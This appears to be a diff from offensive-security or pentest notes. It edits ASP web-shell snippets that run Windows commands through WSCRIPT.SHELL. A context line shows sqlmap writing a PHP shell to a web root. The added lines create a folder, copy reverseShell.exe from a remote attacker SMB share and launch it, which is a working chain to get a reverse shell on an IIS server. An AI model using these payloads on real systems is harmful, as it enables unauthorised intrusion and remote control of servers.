@@ -16,13 +16,20 @@ sqlmap -r file_request --file-write=/root/pwn/http/winterwolfshell.php --file-de
 Dim oS
 On Error Resume Next
 Set oS = Server.CreateObject("WSCRIPT.SHELL")
-Call oS.Run("win.com cmd.exe /c dir C:\test > C:\inetpub\results.txt",0,True)
+Call oS.Run("win.com cmd.exe /C mkdir C:\test",0,True)
 %>
 
 <%
 Dim oS
 On Error Resume Next
 Set oS = Server.CreateObject("WSCRIPT.SHELL")
-Call oS.Run("win.com cmd.exe /c C:\test\re.exe",0,True)
+Call oS.Run("win.com cmd.exe /C copy \\<ip>\share\reverseShell.exe C:\test\reverseShell.exe",0,True)
+%>
+
+<%
+Dim oS
+On Error Resume Next
+Set oS = Server.CreateObject("WSCRIPT.SHELL")
+Call oS.Run("win.com cmd.exe /C start C:\test\reverseShell.exe",0,True)
 %>
 ```
